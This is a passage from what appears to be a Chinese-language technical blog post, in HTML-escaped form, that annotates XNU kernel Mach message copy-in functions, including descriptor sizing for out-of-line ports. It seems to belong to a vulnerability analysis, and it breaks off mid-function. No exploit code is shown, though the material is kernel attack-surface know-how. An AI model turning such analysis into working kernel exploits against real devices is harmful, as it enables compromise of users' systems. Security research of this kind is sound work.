class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_kmsg_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_INVALID_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 通过size找到kmsg尾部trailer的起始地址，进行初始化&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TRAILER_FORMAT_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TRAILER_MINIMUM_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsgp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin()&lt;/code&gt;是我们这里重点分析的逻辑，整个代码我删掉了业务无关的部分，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_header()&lt;/code&gt;跟我们要分析的逻辑无关，主要看函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_body()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_priority_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_body()&lt;/code&gt;先判断OOL数据是否满足条件，并且视情况对内核空间进行调整，最后调用关键函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_copyin_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt;       		&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// #define VM_MAX_ADDRESS		((vm_address_t) 0x80000000)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;is_task_64bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_MAX_ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;complex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;space_needed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;paddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vm_map_copy_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_MAP_COPY_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_ool_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 目标端口&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 内核态消息体的起始地址&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 如果msgh_descriptor_count为0表示没有数据，直接返回，此处我们设置的是1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;cm&quot;&gt;/* make sure the descriptor fits in the message */&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// 结构体mach_msg_ool_ports_descriptor_t第一个字段为地址&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// void*                         address;&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// 64位是8字节，32位是4字节&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_task_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_VOLATILE_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;naddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

